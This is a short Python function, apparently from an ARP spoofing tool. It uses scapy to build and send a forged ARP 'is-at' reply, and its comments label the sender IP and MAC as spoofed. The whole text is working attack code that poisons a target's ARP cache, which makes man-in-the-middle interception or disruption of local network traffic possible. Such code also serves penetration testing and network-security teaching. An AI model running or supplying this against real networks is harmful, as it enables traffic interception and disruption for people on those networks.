from scapy.all import ARP, Ether, sendp, hexdump

def send_arp_response(param, printed=True):
    """Sends an ARP reply with the specified parameters."""
    ip_src = str(param.ip_src)
    ip_dst = str(param.ip_dst)
    eth_src = str(param.eth_src).replace('-', ':')
    eth_dst = str(param.eth_dst).replace('-', ':')
    iface = str(param.iface)

    # Creates an ARP packet
    arp_reply = ARP(
        pdst=ip_dst,  # Destination IP address (who are we sending the reply to)
        hwdst=eth_dst,  # Destination MAC address
        psrc=ip_src,  # Sender IP address (spoofed IP)
        hwsrc=eth_src,  # Sender MAC address (spoofed MAC)
        op="is-at" #ARP reply
    )

    # Creates an Ethernet packet for the data link layer
    ether = Ether(src=eth_src, dst=eth_dst)

    # Combines the two packets into one
    packet = ether/arp_reply
    # Sends the packet
    try:
        sendp(packet, iface=iface, verbose=False)
        if printed:
            param.logger.info(f"Sent response: {ip_src} -> {ip_dst}: {ip_src} is at {eth_src}")
            hexdump(packet)
        return True
    except Exception as e:
        param.logger.error(f"Packet was not sent: {e}")
        return False
